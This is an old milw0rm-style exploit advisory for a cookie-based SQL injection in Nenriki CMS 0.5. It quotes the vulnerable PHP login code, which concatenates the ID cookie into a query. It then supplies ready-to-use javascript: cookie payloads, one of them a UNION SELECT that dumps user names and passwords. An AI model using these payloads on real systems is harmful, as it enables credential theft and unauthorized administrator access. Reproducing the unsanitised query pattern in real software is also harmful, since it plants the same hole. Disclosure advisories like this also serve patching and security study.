<html><head><title>Nenriki Cms 0.5 (COOKIE) Remote SQL Injection Vulnerability</title></head><pre>#########################################################################################
[0x01] Informations:
Name           : Nenriki Cms 0.5
Download       : Source Forge
Vulnerability  : Sql Injection By Cookie
Author         : x0r
Contact        : andry2000@hotmail.it
Notes          : Proud to be Italian
#########################################################################################
[0x02] Bug:
Bugged Page: index.php
[Code]
If($_COOKIE['password']) {
        $query=(&quot;select * from users where(ID='&quot; . $_COOKIE['ID'] . &quot;')&quot;);        //get password
$result=mysql_db_query($linkvars['DB'], $query, $link);
        while($row=mysql_fetch_array($result)) {
                If($_COOKIE['password']==$row['password']) {
                        $admin['inline'] = true;
                        $admin['privs'] = $row['privs'];
                }
        }
}
[/code]
#########################################################################################
[0x03] Exploits:
Exploits:       javascript:document.cookie =&quot;password=1; path=/&quot; then
                javascript:document.cookie =&quot;ID=' union select 0,0,0,concat(id,name,char(58),password),0,0 from users--; path=/&quot;
########################################################################################

# milw0rm.com [2009-03-10]</pre></html>